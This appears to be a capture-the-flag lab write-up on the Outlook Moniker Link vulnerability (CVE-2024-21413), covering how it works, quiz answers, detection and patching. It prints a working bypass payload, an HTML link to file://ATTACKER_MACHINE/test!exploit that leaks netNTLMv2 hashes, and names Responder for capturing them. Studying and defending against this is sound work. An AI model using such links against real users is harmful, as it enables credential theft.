Introduction

On February 13th, 2024, Microsoft announced a Microsoft Outlook RCE & credential leak vulnerability with the assigned CVE of CVE-2024-21413 (Moniker Link). Haifei Li of Check Point Research is credited with discovering the vulnerability.
Working: The vulnerability bypasses Outlook's security mechanisms when handing a specific type of hyperlink known as a Moniker Link. An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim, resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.

CVSS	                    Description
Publish date	    February 13th, 2024
MS article	        https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413
Impact	            Remote Code Execution & Credential Leak
Severity	        Critical
Attack Complexity	Low
Scoring	            9.8
Note: CVSS is abbrivation for Common Vulnerability Scoring System.

The vulnerability is known to affect the following Office releases:
Release	                                            Version
Microsoft Office LTSC 2021	                affected from 19.0.0
Microsoft 365 Apps for Enterprise           affected from 16.0.1
Microsoft Office 2019                       affected from 16.0.1
Microsoft Office 2016                       affected from 16.0.0 before 16.0.5435.1001

Learning Objectives
1. How the vulnerability works
2. Understand Outlook's "Protected View"
3. Using the vulnerability to leak credentials from an Outlook client
4. Detection and mitigation measures

Question 1: What "Severity" rating has the CVE been assigned?
Answer: Critical


Moniker Link (CVE-2024-21413)

Outlook can render emails as HTML.Additionally, Outlook can parse hyperlinks such as HTTP and HTTPS. However, it can also open URLs specifying applications known as Moniker Links. Normally, Outlook will prompt a security warning when external applications are triggered.
This pop-up is a result of Outlook's "Protected View". Protected View opens emails containing attachments, hyperlinks and similar content in read-only mode, blocking things such as macros (especially from outside an organisation). 

By using the file:// Moniker Link in our hyperlink, we can instruct Outlook to attempt to access a file, such as a file on a network share (<a href="file://ATTACKER_IP/test">Click me</a>). The SMB protocol is used, which involves using local credentials for authentication. However, Outlook's "Protected View" catches and blocks this attempt.
HTML code: <p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>

The vulnerability here exists by modifying our hyperlink to include the ! special character and some text in our Moniker Link which results in bypassing Outlook’s Protected View. 
HTML code: <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

We, as attackers, can provide a Moniker Link of this nature for the attack. Note the share does not need to exist on the remote device, as an authentication attempt will be attempted regardless, leading to the victim's Windows netNTLMv2 hash being sent to the attacker.

Note: Remote Code Execution (RCE) is possible because Moniker Links uses the Component Object Model (COM) on Windows, no publicly released proof of concept for achieving RCE via this specific CVE.

Question 2: What Moniker Link type do we use in the hyperlink?
Answer: file://

Question 3: What is the special character used to bypass Outlook's "Protected View"?
Answer: !


Exploitation

For this attack, we will email our victim a Moniker Link similar to the one provided in the previous task. The objective, as the attacker, is to craft an email to the victim with a Moniker Link that bypasses Outlook's "Protected View", where the victim’s client will attempt to load a file from our attacking machine, resulting in the victim’s netNTLMv2 hash being captured.

The PoC:
Takes an attacker & victim email. Normally, you would need to use your own SMTP server (this has already been provided for you in this room)
Requires the password to authenticate. For this room, the password for attacker@monikerlink.thm is attacker
Contains the email content (html_content), which contains our Moniker Link as a HTML hyperlink
Then, fill in the "subject", "from" and "to" fields in the email
Finally, it sends the email to the mail server

Question 4: What is the name of the application that we use on the AttackBox to capture the user's hash?
Answer: responder

Question 5: What type of hash is captured once the hyperlink in the email has been clicked?
Answer: netNTLMv2


Detection

YARA
A Yara rule has been created by Florian Roth to detect emails containing the file:\\ element in the Moniker Link.
Yara rule: https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar

Wireshark
Additionally, the SMB request from the victim to the client can be seen in a packet capture with a truncated netNTLMv2 hash.


Remediation

Microsoft has included patches to resolve this vulnerability in February’s “patch Tuesday” release. You can see a list of KB articles by Office build here. Updating Office through Windows Update or the Microsoft Update Catalog is strongly recommended.

Additionally, in the meantime, it is a timely reminder to practice general - safe - cyber security practices. For example, reminding users to:
1. Do not click random links (especially from unsolicited emails)
2. Preview links before clicking them
3. Forward suspicious emails to the respective department responsible for cyber security

Note: Since this vulnerability bypasses Outlook's Protected View, there is no way to reconfigure Outlook to prevent this attack. Additionally, preventing the SMB protocol entirely may do more harm than good, especially as it is essential for accessing network shares. However, you may be able to block this at the firewall level, depending on the organisation.


Conclusion

Remember, it is essential to update Outlook through Windows Update or the Microsoft Update Catalog as soon as possible, as there is no way to prevent Outlook's "Protected View" from being bypassed.